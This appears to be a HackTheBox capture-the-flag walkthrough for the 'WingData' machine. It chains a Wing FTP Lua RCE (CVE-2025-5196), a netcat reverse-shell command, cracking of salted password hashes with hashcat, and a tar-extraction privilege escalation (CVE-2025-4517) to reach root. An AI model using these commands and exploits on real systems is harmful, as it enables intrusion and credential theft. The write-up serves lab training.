---
title: HackTheBox - WingData
author: r2cook
categories:
  - HackTheBox
tags:
  - WingFTP
  - CVE-2025-5196
  - LuaInjection
  - hashcat
  - RCE
  - CVE-2025-4517
  - tar
  - tar-extraction-vulnerability
render_with_liquid: false
media_subpath: /images/htb/WingData/
image:
  path: room_image.png
date: 2026-04-19
---

> In this walkthrough, we compromise the HackTheBox **WingData** machine by enumerating a **Wing FTP Server** instance, discovering an exposed **anonymous login access**, leveraging **CVE-2025-5196 for Lua-based RCE**, extracting **hashed credentials from user XML files**, cracking them using **Hashcat with a custom salt**, and finally escalating privileges via a **misconfigured sudo Python backup restore script abusing tar extraction (CVE-2025-4517)** to obtain the root flag.

---

## Initial Setup

First, add the target to your hosts file:

```plaintext
10.129.32.187 wingdata.htb
````
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
$ rustscan -a wingdata.htb -g  
10.129.32.187 -> [22,80]

$ nmap -sC -sV -Pn -T4 -p 22,80 -oA scan wingdata.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-18 02:42 +0200
Nmap scan report for wingdata.htb (10.129.32.187)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux
```
{: .nolineno }

---

## Web Enumeration (Port 80)

![](web_80.png){: width="800" height="400" .shadow }

Clicking on **Client Portal** redirects us to a subdomain:

```
ftp.wingdata.htb
```

![](ftp_subdomain_found.png){: width="800" height="400" .shadow }

We add it to `/etc/hosts`:

```plaintext
10.129.32.187 wingdata.htb ftp.wingdata.htb
```
{: file="/etc/hosts" }

After refreshing, we are presented with a login page showing:

> Wing FTP Server v7.4.3

![](ftp_wingdata_login.png){: width="800" height="400" .shadow }

---

## Anonymous Access

Since FTP services often allow anonymous login, I tested:

- Username: `anonymous`
    
- Password: _(empty)_

And it worked.

![](anonymous_login.png){: width="800" height="400" .shadow }

However, file upload was restricted, so no direct reverse shell upload was possible.

---

## Exploitation – CVE-2025-5196 (Lua RCE)

Researching the service version leads to:

> Wing FTP Server v7.4.3 Lua Admin Console vulnerability

### Summary

A vulnerability in the Lua-based admin console allows **remote code execution** through improper privilege handling.

[CVE-2025-5196](https://nvd.nist.gov/vuln/detail/CVE-2025-5196)  
PoC: [Exploit-DB](https://www.exploit-db.com/exploits/52347)

After downloading and testing the PoC locally, executing a simple command like `id` confirmed RCE.

![](testing_PoC.png){: width="800" height="400" .shadow }

---

## Shell as wingftp

Using the exploit, I spawned a reverse shell:

```shell
nc -e /bin/sh <YOUR_IP> 9001
```
{: .nolineno }

![](shell_as_wingftp.png){: width="800" height="400" .shadow }

We now have a shell as **wingftp**.

---

## Credential Enumeration

During enumeration, I discovered:

```
/opt/wftpserver/Data/1/users
```

Inside this directory, multiple `.xml` files exist, each representing a user.

![](users_xml_found.png){: width="800" height="400" .shadow }

Each file contains a **SHA-256 password hash**:

![](cat_anonymous.png){: width="800" height="400" .shadow }

I extracted all hashes:

```plaintext
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
```
{: file="hashes.txt"}

Using `hashid` gave an initial hint that the hashes are SHA-256 based.

![](hashid.png){: width="800" height="400" .shadow }

---

## Hash Cracking (Salted SHA-256)

Initial cracking attempts failed.

After researching Wing FTP documentation, I discovered passwords are stored with a default salt:

```
WingFTP
```

![](wingftp_defualt_salt.png){: width="800" height="400" .shadow }

So I appended the salt:

```plaintext
<hash>:WingFTP
```

Updated file:

```plaintext
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
````
{: file="hashes.txt"}

Before running Hashcat, I needed to determine the correct hash mode. 

To confirm the exact Hashcat mode, I searched through the built-in examples:

```shell
$ hashcat --example-hashes | less
```
{: .nolineno }

Inside the viewer, I searched for SHA-256 patterns:

```
/sha256
```

This led to identifying the correct mode for salted SHA-256:

![](hashcat_mode_search.png){: width="800" height="400" .shadow }

With the correct mode confirmed, I proceeded with cracking:

```shell
$ hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

We successfully recovered one password belonging to user **wacky**.

---

## Shell as wacky

Using SSH:

```shell
ssh wacky@wingdata.htb
```
{: .nolineno }

We successfully logged in and obtained the user flag.

![](shell_as_wacky.png){: width="800" height="400" .shadow }

---

## Privilege Escalation (Root)

Checking sudo permissions:

![](wacky_sudo_l.png){: width="800" height="400" .shadow }

---

## Vulnerable Backup Script

The script restores backup archives as root.

Key behavior:

- Takes `backup_<id>.tar`
    
- Extracts it using Python tar handling
    
- Uses:
    

```python
tar.extractall(path=staging_dir, filter="data")
```

![](tar_extractall.png){: width="800" height="400" .shadow }

---

## Exploitation – CVE-2025-4517

This extraction method is vulnerable to **tar path traversal / filter bypass**, allowing file overwrite as root.

Research confirms:

![](tar_extractall_exploits_search.png){: width="800" height="400" .shadow }

[CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)

[GitHub PoC](https://github.com/AzureADTrent/CVE-2025-4517-POC/tree/main)

---

## Root Shell

Using the exploit

![](shell_as_root.png){: width="800" height="400" .shadow }

We successfully obtain the **root flag**.

---
